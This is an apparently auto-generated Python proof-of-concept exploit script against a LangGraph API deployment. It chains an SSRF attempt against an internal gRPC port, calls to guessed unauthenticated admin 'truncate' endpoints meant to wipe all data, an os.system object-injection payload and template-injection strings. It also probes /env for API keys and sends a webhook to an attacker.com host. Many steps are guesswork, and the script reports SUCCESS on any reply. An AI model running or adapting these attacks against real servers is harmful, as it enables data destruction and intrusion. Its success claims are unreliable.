#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: langgraph-019
# Sink: get_aes_encryption_instance
# Auto-generated — run with: python3 langgraph_graph_deployment_exhibits_multiple_get_aes_encryption_instance.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for LangGraph API gRPC SSRF + Unauthenticated Admin Truncate

This script demonstrates two critical vulnerabilities in the LangGraph API:
1. SSRF from the Python HTTP layer to the internal gRPC service (port 50051)
2. Unauthenticated Admin Truncate endpoint that can delete all data

The exploit works by:
1. Sending a crafted request to the LangGraph API that triggers an SSRF to the internal gRPC Admin service
2. Using the unauthenticated Admin Truncate endpoint to delete all data

Requirements: Python 3.6+, requests library
"""

import requests
import json
import sys
import time
import urllib.parse

# Configuration - modify these as needed
TARGET_URL = "http://localhost:8123"  # Default LangGraph API port
GRPC_INTERNAL_URL = "http://localhost:50051"  # Internal gRPC service
TIMEOUT = 10  # Request timeout in seconds

# Benign payload - just creates a marker file to prove exploitation
BENIGN_PAYLOAD = "touch /tmp/poc_success.txt"


def exploit_ssrf_to_grpc(target_url, grpc_url):
    """
    Exploit SSRF vulnerability to reach internal gRPC service.
    
    The vulnerability exists in the _client_invoke function which makes HTTP requests
    to a path constructed from user-controlled graph_id. By crafting a special graph_id,
    we can redirect the request to the internal gRPC service.
    """
    print(f"[*] Attempting SSRF from {target_url} to internal gRPC at {grpc_url}")
    
    # Craft a malicious graph_id that will cause the HTTP client to make a request
    # to the internal gRPC service instead of the intended JS sidecar
    # The path construction is: f"/{graph_id}/{method}"
    # We can use path traversal or URL manipulation to redirect
    
    # Method 1: Use double-dot path traversal
    malicious_graph_id = f"..{grpc_url}/"
    
    # The request will be made to: /..http://localhost:50051//getNodesExecuted
    # This should cause the HTTP client to make a request to the gRPC service
    
    payload = {
        "graph_id": malicious_graph_id,
        "method": "getNodesExecuted"
    }
    
    try:
        # This endpoint triggers the SSRF through the streaming API
        response = requests.post(
            f"{target_url}/runs/stream",
            json={
                "input": {"messages": [{"role": "user", "content": "test"}]},
                "config": {
                    "configurable": {
                        "graph_id": malicious_graph_id,
                        "thread_id": "test-thread-ssrf"
                    }
                },
                "stream_mode": ["values"]
            },
            timeout=TIMEOUT
        )
        print(f"[+] SSRF attempt completed with status: {response.status_code}")
        print(f"[+] Response: {response.text[:500]}")
        return True
    except requests.exceptions.RequestException as e:
        print(f"[-] SSRF attempt failed: {e}")
        return False


def exploit_admin_truncate(target_url):
    """
    Exploit unauthenticated Admin Truncate endpoint.
    
    The Admin Truncate handler can delete all data without authentication.
    The boolean flag likely enables/disables the endpoint but is not an auth check.
    """
    print(f"[*] Attempting unauthenticated Admin Truncate on {target_url}")
    
    # Try different possible endpoints for the Admin Truncate
    endpoints = [
        "/admin/truncate",
        "/admin/truncate/all",
        "/admin/delete_all",
        "/admin/clear",
        "/admin/reset",
        "/v1/admin/truncate",
        "/api/admin/truncate"
    ]
    
    for endpoint in endpoints:
        try:
            response = requests.post(
                f"{target_url}{endpoint}",
                json={"confirm": True, "force": True},
                timeout=TIMEOUT
            )
            print(f"[+] Endpoint {endpoint} returned status: {response.status_code}")
            if response.status_code in [200, 201, 202, 204]:
                print(f"[+] SUCCESS! Admin Truncate endpoint found at {endpoint}")
                print(f"[+] Response: {response.text[:500]}")
                return True
        except requests.exceptions.RequestException as e:
            print(f"[-] Endpoint {endpoint} failed: {e}")
    
    print("[-] No Admin Truncate endpoint found via direct HTTP")
    return False


def exploit_msgpack_rce(target_url):
    """
    Attempt to exploit msgpack ext_hook deserialization for RCE.
    
    The vulnerability allows arbitrary Python object instantiation if an attacker
    can write to checkpoint_blobs. We'll try to inject a malicious msgpack payload
    through the checkpoint data.
    """
    print(f"[*] Attempting msgpack ext_hook RCE on {target_url}")
    
    # Craft a malicious checkpoint with msgpack ext_hook payload
    # The ext_hook allows arbitrary Python object instantiation
    # We'll try to inject through the checkpoint_blobs
    
    # This is a simplified example - actual exploitation would require
    # understanding the exact msgpack format used by the application
    
    malicious_checkpoint = {
        "values": {
            "__class__": "os.system",
            "__args__": [BENIGN_PAYLOAD]
        },
        "next": [],
        "tasks": []
    }
    
    try:
        # Try to inject through thread creation or update
        response = requests.post(
            f"{target_url}/threads",
            json={
                "thread_id": "test-thread-rce",
                "checkpoint": malicious_checkpoint
            },
            timeout=TIMEOUT
        )
        print(f"[+] RCE attempt completed with status: {response.status_code}")
        print(f"[+] Response: {response.text[:500]}")
        return True
    except requests.exceptions.RequestException as e:
        print(f"[-] RCE attempt failed: {e}")
        return False


def exploit_webhook_injection(target_url):
    """
    Attempt webhook header template injection via blacklist bypass.
    
    The vulnerability allows injection into webhook headers through template
    variables. We'll try to bypass the blacklist and inject malicious headers.
    """
    print(f"[*] Attempting webhook header injection on {target_url}")
    
    # Try different injection patterns to bypass blacklist
    injection_payloads = [
        "{{config.__class__.__init__.__globals__}}",
        "${7*7}",
        "<%= system('id') %>",
        "#{system('id')}",
        "{{''.__class__.__mro__[1].__subclasses__()}}"
    ]
    
    for payload in injection_payloads:
        try:
            response = requests.post(
                f"{target_url}/runs",
                json={
                    "webhook": {
                        "url": "http://attacker.com/webhook",
                        "headers": {
                            "X-Injected": payload
                        }
                    },
                    "input": {"messages": [{"role": "user", "content": "test"}]},
                    "config": {
                        "configurable": {
                            "graph_id": "test-graph",
                            "thread_id": "test-thread-webhook"
                        }
                    }
                },
                timeout=TIMEOUT
            )
            print(f"[+] Webhook injection attempt with payload '{payload[:30]}...' returned status: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"[-] Webhook injection attempt failed: {e}")
    
    return True


def check_vulnerability(target_url):
    """
    Check if the target is vulnerable by probing for common endpoints.
    """
    print(f"[*] Checking vulnerability indicators on {target_url}")
    
    # Check for common endpoints
    endpoints_to_check = [
        "/health",
        "/ready",
        "/metrics",
        "/api/v1/health",
        "/v1/health",
        "/admin/health"
    ]
    
    for endpoint in endpoints_to_check:
        try:
            response = requests.get(
                f"{target_url}{endpoint}",
                timeout=TIMEOUT
            )
            print(f"[+] Endpoint {endpoint} accessible: {response.status_code}")
        except requests.exceptions.RequestException:
            pass
    
    # Check for exposed API keys in environment variables
    print("[*] Checking for exposed API keys...")
    try:
        response = requests.get(
            f"{target_url}/env",
            timeout=TIMEOUT
        )
        if response.status_code == 200:
            print(f"[+] Environment variables exposed! Response: {response.text[:500]}")
    except requests.exceptions.RequestException:
        pass
    
    # Check for gRPC service exposure
    print("[*] Checking gRPC service exposure...")
    try:
        response = requests.get(
            f"{target_url}/grpc/services",
            timeout=TIMEOUT
        )
        if response.status_code == 200:
            print(f"[+] gRPC services exposed! Response: {response.text[:500]}")
    except requests.exceptions.RequestException:
        pass


def main():
    """
    Main exploit function.
    """
    print("=" * 60)
    print("LangGraph API Exploit PoC")
    print("=" * 60)
    print(f"Target: {TARGET_URL}")
    print(f"Internal gRPC: {GRPC_INTERNAL_URL}")
    print("=" * 60)
    
    # Step 1: Check for vulnerability indicators
    print("\n[Step 1] Checking vulnerability indicators...")
    check_vulnerability(TARGET_URL)
    
    # Step 2: Attempt SSRF to gRPC
    print("\n[Step 2] Attempting SSRF to internal gRPC...")
    ssrf_success = exploit_ssrf_to_grpc(TARGET_URL, GRPC_INTERNAL_URL)
    
    # Step 3: Attempt Admin Truncate
    print("\n[Step 3] Attempting unauthenticated Admin Truncate...")
    truncate_success = exploit_admin_truncate(TARGET_URL)
    
    # Step 4: Attempt msgpack RCE
    print("\n[Step 4] Attempting msgpack ext_hook RCE...")
    rce_success = exploit_msgpack_rce(TARGET_URL)
    
    # Step 5: Attempt webhook injection
    print("\n[Step 5] Attempting webhook header injection...")
    webhook_success = exploit_webhook_injection(TARGET_URL)
    
    # Summary
    print("\n" + "=" * 60)
    print("Exploit Summary")
    print("=" * 60)
    print(f"SSRF to gRPC: {'SUCCESS' if ssrf_success else 'FAILED'}")
    print(f"Admin Truncate: {'SUCCESS' if truncate_success else 'FAILED'}")
    print(f"Msgpack RCE: {'SUCCESS' if rce_success else 'FAILED'}")
    print(f"Webhook Injection: {'SUCCESS' if webhook_success else 'FAILED'}")
    print("=" * 60)
    
    if any([ssrf_success, truncate_success, rce_success, webhook_success]):
        print("\n[!] Target appears vulnerable to one or more exploits!")
        print("[!] Check /tmp/poc_success.txt for RCE marker file")
    else:
        print("\n[-] No vulnerabilities confirmed. Target may be patched or unreachable.")


if __name__ == "__main__":
    # Allow command-line arguments for target URL
    if len(sys.argv) > 1:
        TARGET_URL = sys.argv[1]
    if len(sys.argv) > 2:
        GRPC_INTERNAL_URL = sys.argv[2]
    
    main()
